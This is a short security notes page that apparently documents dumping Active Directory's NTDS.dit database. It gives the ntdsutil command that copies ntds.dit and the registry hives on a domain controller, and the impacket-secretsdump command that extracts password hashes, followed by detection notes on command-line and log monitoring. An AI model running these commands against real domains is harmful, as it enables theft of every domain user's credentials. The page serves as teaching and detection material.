---
description: >-
  Dumping and enumerating NTDS.dit - a file that contains information about
  Active Directory users (hashes!).
---

# NTDS - Domain Controller

## Execution

Dumping the required files using a native windows binary ntdsutil.exe to c:\temp:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:

![](../../.gitbook/assets/ntdsutil-attacker.png)

We can then dump password hashes:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```bash
root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/ntds-hashdump%20%281%29.png)

## Observations

On the victim machine, no susprises:

![](../../.gitbook/assets/ntdsutil-procexp.png)

Monitoring commandline arguments is as usual a good idea as it can reveal attempts to dump ntds.dit:

![](../../.gitbook/assets/ntdsutil-cmdline.png)

Additionally, there are multiple Application logs that can indicate some activity around the ntds.dit which you may be interested in investigating further:

![](../../.gitbook/assets/ntds-appllication-log.png)

{% embed data="{\"url\":\"https://adsecurity.org/?p=2362\",\"type\":\"link\",\"title\":\"Attack Methods for Gaining Domain Admin Rights in Active Directory – Active Directory Security\",\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://adsecurity.org/wp-content/uploads/2015/12/MS14068-01.png\",\"width\":600,\"height\":470,\"aspectRatio\":0.7833333333333333}}" %}

{% embed data="{\"url\":\"https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-\(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM\)/\",\"type\":\"link\",\"title\":\"Tutorial for NTDS goodness \(VSSADMIN, WMIS, NTDS.dit, SYSTEM\)\",\"description\":\"I recently performed an internal penetration test where the NTDS.dit file got me thousands of password hashes. After compromising unpatched Microsoft Windows computers on the client\'s domain, I gained access to a number of domain accounts. Below I\'ll explain how...\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.trustwave.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://www.trustwave.com/uploadedImages/Images/Social\_Share\_Images/Default-Facebook.png\",\"width\":1200,\"height\":627,\"aspectRatio\":0.5225}}" %}



